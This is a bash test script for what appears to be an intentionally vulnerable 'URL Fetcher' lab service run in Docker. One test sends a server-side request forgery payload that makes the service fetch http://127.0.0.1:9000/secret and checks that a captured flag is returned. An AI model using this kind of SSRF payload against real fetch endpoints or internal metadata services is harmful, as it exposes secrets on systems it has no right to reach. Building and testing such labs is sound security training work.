#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

PORT=8083
FAIL=0

# 1. Service responds
OUT=$(curl -sf "http://localhost:$PORT/")
if echo "$OUT" | grep -q "URL Fetcher"; then
  echo "[+] PASS: service is up"
else
  echo "[-] FAIL: service not responding: $OUT"; FAIL=1
fi

# 2. SSRF to internal /secret returns flag
OUT=$(curl -sf "http://localhost:$PORT/fetch?url=http://127.0.0.1:9000/secret")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: SSRF to internal metadata service captured flag"
else
  echo "[-] FAIL (ssrf): $OUT"; FAIL=1
fi

# 3. Unknown internal path returns 502 (internal server 404 -> outer 502)
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  "http://localhost:$PORT/fetch?url=http://127.0.0.1:9000/notfound")
if [ "$STATUS" = "502" ]; then
  echo "[+] PASS: internal 404 propagates as 502"
else
  echo "[-] FAIL: expected 502 for unknown path, got $STATUS"; FAIL=1
fi

# 4. Invalid URL returns 502
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  "http://localhost:$PORT/fetch?url=http://0.0.0.0:1")
if [ "$STATUS" = "502" ]; then
  echo "[+] PASS: unreachable URL returns 502"
else
  echo "[-] FAIL: expected 502 for unreachable URL, got $STATUS"; FAIL=1
fi

if [ "$FAIL" -eq 0 ]; then
  echo "[+] All tests passed"
  exit 0
else
  echo "[-] One or more tests failed"
  exit 1
fi
